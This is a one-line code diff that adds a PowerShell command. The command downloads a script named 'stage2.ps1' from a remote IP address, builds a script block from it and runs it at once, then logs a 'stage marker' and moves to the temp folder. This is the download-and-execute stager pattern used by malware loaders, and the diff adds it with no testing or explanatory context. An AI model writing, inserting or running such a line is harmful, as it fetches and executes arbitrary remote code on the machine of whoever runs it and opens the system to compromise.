@@ -1,0 +1,1 @@
+$StageScript = (iwr "https://203.0.113.15:443/stage2.ps1" -UseBasicParsing).Content; [ScriptBlock]::Create($StageScript).Invoke(); Write-Verbose "stage marker 23 reached"; Set-Location -Path $env:TEMP
